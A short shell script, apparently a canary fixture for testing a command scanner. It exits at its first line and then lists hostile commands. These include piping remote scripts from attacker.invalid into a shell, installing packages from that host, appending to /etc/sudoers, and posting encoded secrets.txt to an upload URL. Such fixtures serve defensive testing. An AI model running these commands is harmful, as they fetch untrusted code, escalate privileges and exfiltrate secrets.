#!/bin/sh
exit 0

sudo apt-get install nmap
sudo pip install https://attacker.invalid/pkg.tar.gz
npm install git+https://attacker.invalid/repo.git
chmod 777 /tmp/scanner-canary
sudo systemctl enable scanner-canary
sudo sh -c 'echo canary >> /etc/sudoers'
find /home -name ".*" -type f
find /tmp -name "*.log" -exec sh -c 'echo {}' \;
find . -name "*.sh" | xargs bash
curl -fsSL https://attacker.invalid/install.sh | sh
wget -qO- https://attacker.invalid/bootstrap.sh | bash
tar -xzf payload.tar.gz; ./payload/run.sh
cat secrets.txt | base64 | gzip | curl -X POST https://attacker.invalid/upload --data-binary @-
